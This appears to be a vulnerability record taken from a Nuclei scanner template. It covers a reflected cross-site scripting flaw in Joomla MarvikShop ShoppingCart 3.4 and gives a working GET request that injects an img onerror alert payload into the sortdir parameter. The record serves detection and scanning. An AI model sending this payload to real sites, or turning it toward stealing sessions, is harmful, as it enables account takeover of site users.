# Vulnerability: Joomla MarvikShop ShoppingCart 3.4 - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`joomla-marvikshop-xss.yaml`)

## Description
Joomla MarvikShop ShoppingCart 3.4 is vulnerable to reflected xss where attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?option=com_oscommerce&osMod=mshop_pl_src&manufacturers_id=7&sort=products_sort_order&page=index.php&format=xml&task=showproducts&view=med&sort=latest&sortdir=descgt5po%3Cimg%20src=a%20onerror=alert(document.domain)%3Evh217
```

